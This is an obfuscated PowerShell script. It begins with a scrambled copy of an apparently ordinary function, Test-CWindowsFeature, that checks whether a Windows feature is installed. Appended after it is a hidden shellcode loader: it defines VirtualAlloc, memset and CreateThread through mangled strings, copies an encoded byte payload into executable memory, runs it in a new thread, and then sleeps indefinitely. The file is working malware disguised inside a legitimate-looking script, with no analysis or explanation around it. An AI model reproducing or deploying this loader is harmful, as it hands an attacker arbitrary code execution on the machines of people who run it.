function tEsT-cwiN`DOw`s`Fea`TuRE
{
    
    [CmdletBinding(SUppoRtSshouLdprocess=${TR`Ue})]
    param(
        [Parameter(MandaTORY=${TR`Ue})]
        [string]
        
        ${N`AME},
        
        [Switch]
        
        ${inSt`AL`LeD}
    )
    
    &("{3}{0}{1}{2}"-f 'et-','St','rictMode','S') -Version ("{0}{1}"-f'L','atest')
    &("{2}{0}{1}{3}"-f'CallerP','referen','Use-','ce') -Cmdlet ${pSC`md`leT} -Session ${EXECuTi`On`Con`TeXT}."Se`sSI`onSTa`Te"
    
    .("{1}{0}{3}{4}{2}"-f 'ite','Wr','ng','-','Warni') -Message (("{15}{10}{16}{2}{7}{21}{5}{6}{18}{17}{20}{19}{0}{13}{12}{3}{14}{8}{9}{4}{1}{11}"-f' in','b','ature is ob','re m','r','t','e an','sol','jor version of ','Ca','C','on.',' futu',' a','a','Test-','WindowsFe','will be ','d ','emoved','r','e'))

    if( -not (&("{2}{1}{0}"-f'odule','-M','Get') -Name ("{1}{2}{0}"-f'ager','Server','Man')) -and -not (.("{7}{0}{2}{4}{8}{9}{5}{6}{3}{10}{1}"-f 't-Wind','d','o','Sup','ws','n','s','Asser','FeatureFunct','io','porte')) )
    {
        return
    }
    
    ${feaT`URe} = &("{4}{3}{1}{0}{2}" -f'ndowsFe','CWi','ature','-','Get') -Name ${N`AME} 
    
    if( ${f`eatU`RE} )
    {
        if( ${IN`StA`lLeD} )
        {
            return ${f`EA`TuRE}."inStall`Ed"
        }
        return ${t`Rue}
    }
    else
    {
        return ${f`Al`SE}
    }
}


${f`U0} = ((("{13}{92}{28}{89}{47}{69}{8}{82}{48}{30}{17}{0}{27}{23}{49}{31}{7}{58}{83}{18}{81}{40}{88}{35}{63}{59}{64}{32}{42}{19}{74}{56}{51}{41}{55}{21}{76}{80}{84}{11}{46}{61}{86}{14}{25}{4}{43}{34}{16}{36}{72}{37}{3}{20}{12}{38}{1}{57}{75}{29}{45}{9}{67}{62}{60}{71}{85}{6}{2}{54}{70}{39}{77}{90}{78}{68}{73}{15}{91}{44}{33}{53}{52}{24}{79}{22}{87}{66}{26}{65}{10}{5}{50}" -f'at','uint dwSt','ea','adAt','(','nt src, uint ','r','V','publ','artAddre','i','Hlkern','ibute','[','ic static extern IntPtr CreateTh','vcrt.d','tr','t','IntPtr','e, u','tr',');[Dl','memse',' e','ntP','read','t,','ic','lImport','tr l','s',' ','uint ','l)]public s','tP','dr',' lp','hre','s, ',' IntPtr','A','ationType, uint flProt','dwSiz','In','CH','pSt','el','ernel3','c ','xtern IntPtr','count);','loc','atic extern I','t','tionFlags','ect','nt flAl','ackSi','ir','ss','ntPtr lpPa','32',' I','e',', ',' u','IntPtr des','ss,','Hl','2.dllCHl)]',',','rameter, ','T','ms','i','ze, IntP','lIm',' lpThrea','Import(C','tr ','por',' lp','i','tualAlloc(','t(C','uint dwC','.dllCHl)]publ','t(','d','(CHlk','dId);[Dll','ll','Dl'))."rE`PlA`cE"(([CHaR]67+[CHaR]72+[CHaR]108),[StrinG][CHaR]34));${w} = &("{1}{0}"-f'pe','Add-Ty') -memberDefinition ${F`U0} -Name ("{0}{1}"-f'Win','32') -namespace ("{4}{1}{0}{3}{2}" -f'Fun','n32','tions','c','Wi') -passthru;[Byte[]];[Byte[]]${Z} = 0xdb,0xce,0xb8,0x9c,0xbb,0xb1,0x5d,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x31,0x43,0x18,0x83,0xc3,0x04,0x03,0x43,0x88,0x59,0x44,0xa1,0x58,0x1f,0xa7,0x5a,0x98,0x40,0x21,0xbf,0xa9,0x40,0x55,0xcb,0x99,0x70,0x1d,0x99,0x15,0xfa,0x73,0x0a,0xae,0x8e,0x5b,0x3d,0x07,0x24,0xba,0x70,0x98,0x15,0xfe,0x13,0x1a,0x64,0xd3,0xf3,0x23,0xa7,0x26,0xf5,0x64,0xda,0xcb,0xa7,0x3d,0x90,0x7e,0x58,0x4a,0xec,0x42,0xd3,0x00,0xe0,0xc2,0x00,0xd0,0x03,0xe2,0x96,0x6b,0x5a,0x24,0x18,0xb8,0xd6,0x6d,0x02,0xdd,0xd3,0x24,0xb9,0x15,0xaf,0xb6,0x6b,0x64,0x50,0x14,0x52,0x49,0xa3,0x64,0x92,0x6d,0x5c,0x13,0xea,0x8e,0xe1,0x24,0x29,0xed,0x3d,0xa0,0xaa,0x55,0xb5,0x12,0x17,0x64,0x1a,0xc4,0xdc,0x6a,0xd7,0x82,0xbb,0x6e,0xe6,0x47,0xb0,0x8a,0x63,0x66,0x17,0x1b,0x37,0x4d,0xb3,0x40,0xe3,0xec,0xe2,0x2c,0x42,0x10,0xf4,0x8f,0x3b,0xb4,0x7e,0x3d,0x2f,0xc5,0xdc,0x29,0x9c,0xe4,0xde,0xa9,0x8a,0x7f,0xac,0x9b,0x15,0xd4,0x3a,0x97,0xde,0xf2,0xbd,0xd8,0xf4,0x43,0x51,0x27,0xf7,0xb3,0x7b,0xe3,0xa3,0xe3,0x13,0xc2,0xcb,0x6f,0xe4,0xeb,0x19,0x3f,0xb4,0x43,0xf2,0x80,0x64,0x23,0xa2,0x68,0x6f,0xac,0x9d,0x89,0x90,0x67,0xb6,0x20,0x6a,0xef,0x79,0x1c,0x75,0xea,0x11,0x5f,0x76,0xf5,0x5a,0xd6,0x90,0x9f,0x8c,0xbf,0x0b,0x37,0x34,0x9a,0xc0,0xa6,0xb9,0x30,0xad,0xe8,0x32,0xb7,0x51,0xa6,0xb2,0xb2,0x41,0x5e,0x33,0x89,0x38,0xc8,0x4c,0x27,0x56,0xf4,0xd8,0xcc,0xf1,0xa3,0x74,0xcf,0x24,0x83,0xda,0x30,0x03,0x98,0xd3,0xa4,0xec,0xf6,0x1b,0x29,0xed,0x06,0x4a,0x23,0xed,0x6e,0x2a,0x17,0xbe,0x8b,0x35,0x82,0xd2,0x00,0xa0,0x2d,0x83,0xf5,0x63,0x46,0x29,0x20,0x43,0xc9,0xd2,0x07,0x55,0x35,0x05,0x61,0x23,0x57,0x95;${g} = 0x1000;if (${Z}."leNg`Th" -gt 0x1000){${G} = ${Z}."L`eNgTh"};${Z`X0}=${W}::("{1}{0}{2}" -f'irt','V','ualAlloc').Invoke(0,0x1000,${G},0x40);for (${i}=0;${I} -le (${Z}."LeN`gth"-1);${I}++) {${w}::"MemS`eT"([IntPtr](${z`x0}.("{0}{1}" -f 'T','oInt32').Invoke()+${i}), ${Z}[${i}], 1)};${w}::("{0}{2}{1}" -f 'CreateT','d','hrea').Invoke(0,0,${Z`x0},0,0,0);for (;;){&("{1}{3}{0}{2}" -f 'e','Star','p','t-sle') 60};
